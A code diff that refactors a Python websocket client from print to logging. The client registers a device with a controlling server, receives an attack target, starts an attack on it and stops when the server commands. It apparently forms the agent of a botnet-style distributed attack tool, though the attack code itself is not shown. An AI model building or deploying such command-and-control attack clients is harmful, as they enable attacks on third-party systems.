@@ -1,42 +1,50 @@
+import logging
 import sys
 import asyncio
 
 from websockets.exceptions import ConnectionClosed
 
-from lib.utils import wait_for
-from scripts.services.communication_services import get_server_command, get_action
+from scripts.services.communication_services import wait_for_command_from_server, \
+    get_action, \
+    is_needed_to_stop
 from scripts.services.connect_services import connect, register
 from scripts.services.attack_services import start_attack
+
+
+logging.basicConfig(stream=sys.stdout, level=logging.INFO)
+logger = logging.getLogger(__package__)
 
 
 async def start(addr: str):
     websocket = await connect(addr)
     if websocket is None:
-        print("Connection refused during connecting to the server")
+        logger.fatal("Connection refused during connecting to the server")
         return -1
+    logger.info(f"Connected to host server: {addr}")
 
     registration = await register(websocket)
     if registration is None:
-        print("Error trying to register this device on server")
+        logger.fatal("Error trying to register this device on server")
         return -2
+    logger.info(f"Registered on host server: {addr}")
 
     action = await get_action(websocket)
-    print(f"Starting attack on: {action.target}")
+    logger.info(f"Starting attack on: {action.target}")
 
     try:
-        attack, is_attack_running = await start_attack(action.target)
+        attack = await start_attack(action.target)
         while True:
-            if await is_attack_running():
-                print(f"attack stopped on {action.target}")
+            if attack.done():
+                logger.info(f"attack stopped on {action.target}")
                 break
-            message = await wait_for(get_server_command(websocket), 0.1)
-            if message is not None and message['command'].get('title') == 'stop':
-                print(f"server communicated to stop attack on {action.target}")
+            command = await wait_for_command_from_server(websocket)
+            if command is not None and await is_needed_to_stop(command):
+                logger.info(f"server communicated to stop attack on {action.target}")
                 attack.cancel()
                 break
 
     except ConnectionClosed as e:
-        print("Connection was closed: ", e)
+        logger.error(f"Connection was closed: {e}")
     finally:
         await websocket.close()
 
